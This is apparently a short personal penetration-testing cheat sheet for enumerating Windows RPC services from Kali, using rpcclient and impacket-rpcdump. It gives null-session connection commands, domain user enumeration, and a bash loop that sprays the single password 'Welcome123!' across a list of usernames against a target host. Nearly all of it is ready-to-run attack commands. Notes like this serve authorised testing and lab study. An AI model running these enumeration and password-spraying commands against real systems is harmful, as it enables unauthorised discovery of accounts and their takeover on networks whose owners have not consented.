#### Null user enumeration
```bash - kali
rpcclient -U "" -N $TARGET
```

```bash - kali
rpcclient -p 135 -U "" $TARGET
```

#### rpcclient

```bash - kali
rpcclient -U johana $TARGET
```

```bash - kali
help
```

![[Pasted image 20220105214013.png]]

```bash - kali
enumdomusers
```

#### rpcclient.sh
```bash - kali
for u in $(cat users | awk -F@ '{print $1}' | awk -F: '{print $2}');
do 
	rpcclient -U "$u%Welcome123!" -c "getusername;quit" $TARGET | grep Authority;
done
```

```bash - kali
impacket-rpcdump $DOMAIN/$USER:$PASSWORD@$TARGET
```


